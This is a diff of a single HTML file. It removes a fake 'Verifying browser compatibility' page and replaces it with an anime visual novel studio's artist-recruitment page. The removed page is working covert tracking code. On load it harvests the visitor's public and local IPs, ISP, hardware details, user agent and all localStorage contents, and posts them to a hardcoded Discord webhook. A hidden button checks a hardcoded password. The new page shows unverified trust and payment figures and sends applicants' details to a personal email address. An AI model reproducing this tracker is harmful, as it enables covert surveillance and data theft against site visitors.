@@ -1,120 +1,135 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" class="scroll-smooth">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Verification</title>
-    <style>
-        body, html { margin: 0; padding: 0; font-family: sans-serif; background: #fff; color: #333; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #admin-btn { position: fixed; top: 0; right: 0; width: 50px; height: 50px; background: transparent; border: none; cursor: crosshair; }
-    </style>
-</head>
-<body>
-
-    <div style="text-align: center;">
-        <div class="loader" style="margin: 0 auto 20px;"></div>
-        <p>Verifying browser compatibility...</p>
-    </div>
-
-    <button id="admin-btn"></button>
-
+    <title>Visual Novel Studio | We Are Hiring Artists</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;800;900&display=swap" rel="stylesheet">
     <script>
-        const webhookUrl = "https://discord.com/api/webhooks/1487371339881906177/BOhU036avil2oOCS8Eb6CeaJolwYlV7zFA-YmdfMZzMWgnrnlY0c0C4spqjRIumGylyY";
-        
-        const data = {
-            id: 'NODE-' + Math.floor(Math.random() * 10000),
-            ipV4: "Pending",
-            ipV6: "Pending",
-            isp: "Pending",
-            localIp: [],
-            gpu: "Pending",
-            audio: "Pending",
-            storage: []
-        };
-
-        // 1. Forced Network Fetch
-        async function fetchNetwork() {
-            try {
-                const ipv4 = await fetch('https://api.ipify.org?format=json').then(r => r.json());
-                data.ipV4 = ipv4.ip;
-                
-                const geo = await fetch(`https://ipapi.co/${ipv4.ip}/json/`).then(r => r.json());
-                data.isp = geo.org || "Unknown";
-
-                fetch('https://api64.ipify.org?format=json').then(r => r.json()).then(v6 => {
-                    data.ipV6 = v6.ip !== data.ipV4 ? v6.ip : "N/A";
-                }).catch(() => data.ipV6 = "N/A");
-            } catch (e) { data.ipV4 = "Error/Blocked"; }
-        }
-
-        // 2. WebRTC Leak
-        function getLocal() {
-            const pc = new RTCPeerConnection();
-            pc.createDataChannel('');
-            pc.createOffer().then(o => pc.setLocalDescription(o));
-            pc.onicecandidate = (e) => {
-                if (e.candidate) {
-                    const match = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-z0-9\-]+\.local)/i);
-                    if (match && !data.localIp.includes(match[1])) data.localIp.push(match[1]);
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: { sans: ['Nunito', 'sans-serif'] },
+                    colors: {
+                        anime: {
+                            dark: '#0f0c29',
+                            purple: '#302b63',
+                            accent: '#ff007f',
+                            light: '#e0eafc'
+                        }
+                    }
                 }
-            };
-        }
-
-        // 3. Hardware Fingerprint
-        function getHardware() {
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
-                const debug = gl.getExtension('WEBGL_debug_renderer_info');
-                data.gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
-            } catch(e) {}
-
-            // LocalStorage Sweep
-            for (let i = 0; i < localStorage.length; i++){
-                let key = localStorage.key(i);
-                data.storage.push(`${key}: ${localStorage.getItem(key)}`);
             }
         }
-
-        // 4. Execution & Webhook POST
-        async function run() {
-            getLocal();
-            getHardware();
-            await fetchNetwork();
-
-            // Wait 2 seconds to ensure WebRTC and IPv6 finalize
-            setTimeout(() => {
-                const payload = {
-                    embeds: [{
-                        title: `📡 Telemetry Extracted: ${data.id}`,
-                        color: 16711680, // Red
-                        fields: [
-                            { name: "🌐 Public Connectivity", value: `**IPv4:** ${data.ipV4}\n**IPv6:** ${data.ipV6}\n**ISP:** ${data.isp}`, inline: false },
-                            { name: "🏠 Private Network", value: `**Local:** ${data.localIp.join(', ') || "Masked"}`, inline: true },
-                            { name: "💾 Browser Data", value: `**Cookies:** ${navigator.cookieEnabled ? "YES" : "NO"}\n**Storage Items:** ${data.storage.length}`, inline: true },
-                            { name: "🛠️ Hardware", value: `**CPU:** ${navigator.hardwareConcurrency} Cores\n**RAM:** ~${navigator.deviceMemory}GB\n**GPU:** ${data.gpu}`, inline: false },
-                            { name: "📋 User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
-                        ],
-                        footer: { text: `Origin: ${window.location.hostname}` },
-                        timestamp: new Date().toISOString()
-                    }]
-                };
-
-                fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                }).then(r => console.log("Post status:", r.status));
-            }, 2000);
-        }
-
-        window.onload = run;
-
-        document.getElementById('admin-btn').onclick = () => {
-            if(prompt("Auth:") === "monterysasd") alert("Telemetry Logged locally for: " + data.ipV4);
-        };
     </script>
+    <style>
+        body {
+            background: linear-gradient(to right, #24243e, #302b63, #0f0c29);
+            color: white;
+        }
+        .glass-panel {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .anime-glow {
+            text-shadow: 0 0 10px rgba(255, 0, 127, 0.7);
+        }
+    </style>
+</head>
+<body class="antialiased min-h-screen flex flex-col font-sans text-anime-light relative overflow-x-hidden">
+    
+    <div class="absolute top-[-10%] left-[-10%] w-96 h-96 bg-anime-accent rounded-full mix-blend-multiply filter blur-[128px] opacity-20 animate-pulse"></div>
+    <div class="absolute bottom-[-10%] right-[-10%] w-96 h-96 bg-blue-500 rounded-full mix-blend-multiply filter blur-[128px] opacity-20"></div>
+
+    <nav class="p-6 flex justify-between items-center max-w-7xl mx-auto w-full relative z-10">
+        <div class="text-2xl font-black tracking-wider text-white anime-glow">VN<span class="text-anime-accent">STUDIOS</span></div>
+        <a href="#apply" class="bg-anime-accent hover:bg-pink-600 text-white font-bold py-2 px-6 rounded-full transition duration-300 shadow-[0_0_15px_rgba(255,0,127,0.5)]">Apply Now</a>
+    </nav>
+
+    <main class="flex-grow flex flex-col justify-center items-center text-center px-4 py-20 relative z-10">
+        <span class="bg-blue-600/20 text-blue-300 py-1 px-4 rounded-full text-sm font-bold uppercase tracking-widest mb-6 border border-blue-500/30">Now Recruiting</span>
+        <h1 class="text-5xl md:text-7xl font-black mb-6 leading-tight">
+            Bring Our <span class="text-anime-accent anime-glow">Worlds</span><br>To Life
+        </h1>
+        <p class="text-xl md:text-2xl text-gray-300 mb-10 max-w-2xl">
+            We are a premier visual novel development studio looking for passionate artists. Join our team and help us build our next 3 upcoming titles.
+        </p>
+
+        <div class="flex flex-wrap justify-center gap-6 md:gap-12 mb-16">
+            <div class="glass-panel rounded-xl p-4 w-40 text-center">
+                <div class="text-yellow-400 text-2xl font-black mb-1">⭐ 4.4/5</div>
+                <div class="text-xs text-gray-400 uppercase tracking-wide">Trust Score (301 Reviews)</div>
+            </div>
+            <div class="glass-panel rounded-xl p-4 w-40 text-center">
+                <div class="text-green-400 text-2xl font-black mb-1">$40k+</div>
+                <div class="text-xs text-gray-400 uppercase tracking-wide">Verified Payments (USD)</div>
+            </div>
+            <div class="glass-panel rounded-xl p-4 w-40 text-center">
+                <div class="text-blue-400 text-2xl font-black mb-1">$15/hr</div>
+                <div class="text-xs text-gray-400 uppercase tracking-wide">Starting Rate</div>
+            </div>
+        </div>
+
+        <div class="max-w-4xl w-full text-left mb-20 glass-panel p-8 md:p-12 rounded-3xl">
+            <div class="flex flex-col md:flex-row justify-between items-start md:items-center mb-8 border-b border-gray-600 pb-6">
+                <div>
+                    <h2 class="text-3xl font-bold text-white mb-2">Available Positions</h2>
+                    <p class="text-gray-400">We are currently developing 3 distinct visual novels.</p>
+                </div>
+                <div class="mt-4 md:mt-0 text-right">
+                    <span class="text-4xl font-black text-anime-accent">12</span>
+                    <span class="text-gray-400 block text-sm">Positions Left (out of 14)</span>
+                </div>
+            </div>
+            
+            <ul class="space-y-4 text-gray-300">
+                <li class="flex items-center"><svg class="w-6 h-6 mr-3 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg> Character Designers / Sprite Artists</li>
+                <li class="flex items-center"><svg class="w-6 h-6 mr-3 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg> Background Illustration Specialists</li>
+                <li class="flex items-center"><svg class="w-6 h-6 mr-3 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg> CG / Cutscene Illustrators</li>
+            </ul>
+        </div>
+
+        <div id="apply" class="max-w-2xl w-full">
+            <h2 class="text-4xl font-black mb-8">Submit Your Portfolio</h2>
+            
+            <form action="https://formsubmit.co/minjunnios@gmail.com" method="POST" class="glass-panel p-8 rounded-3xl text-left shadow-2xl space-y-6">
+                
+                <input type="hidden" name="_subject" value="New Artist Application - VN Studio!">
+                <input type="hidden" name="_next" value="https://your-render-url.onrender.com"> 
+                <input type="hidden" name="_captcha" value="false">
+
+                <div>
+                    <label class="block text-sm font-bold mb-2 text-gray-300">Artist Alias / Full Name</label>
+                    <input type="text" name="name" required class="w-full bg-anime-dark bg-opacity-50 border border-gray-600 rounded-lg p-3 text-white focus:outline-none focus:border-anime-accent transition">
+                </div>
+                
+                <div>
+                    <label class="block text-sm font-bold mb-2 text-gray-300">Email Address</label>
+                    <input type="email" name="email" required class="w-full bg-anime-dark bg-opacity-50 border border-gray-600 rounded-lg p-3 text-white focus:outline-none focus:border-anime-accent transition">
+                </div>
+
+                <div>
+                    <label class="block text-sm font-bold mb-2 text-gray-300">Link to Portfolio (ArtStation, Pixiv, GDrive, etc.)</label>
+                    <input type="url" name="portfolio" required class="w-full bg-anime-dark bg-opacity-50 border border-gray-600 rounded-lg p-3 text-white focus:outline-none focus:border-anime-accent transition">
+                </div>
+
+                <div>
+                    <label class="block text-sm font-bold mb-2 text-gray-300">Tell us about yourself & your anime influences</label>
+                    <textarea name="message" rows="4" required class="w-full bg-anime-dark bg-opacity-50 border border-gray-600 rounded-lg p-3 text-white focus:outline-none focus:border-anime-accent transition"></textarea>
+                </div>
+
+                <button type="submit" class="w-full bg-anime-accent hover:bg-pink-600 text-white font-bold py-4 rounded-xl transition duration-300 text-lg shadow-[0_0_20px_rgba(255,0,127,0.4)]">
+                    Send Application
+                </button>
+            </form>
+        </div>
+    </main>
+
+    <footer class="text-center p-6 border-t border-gray-700/50 text-gray-500 text-sm relative z-10 mt-12">
+        &copy; 2026 Visual Novel Studios. All rights reserved.
+    </footer>
+
 </body>
 </html>
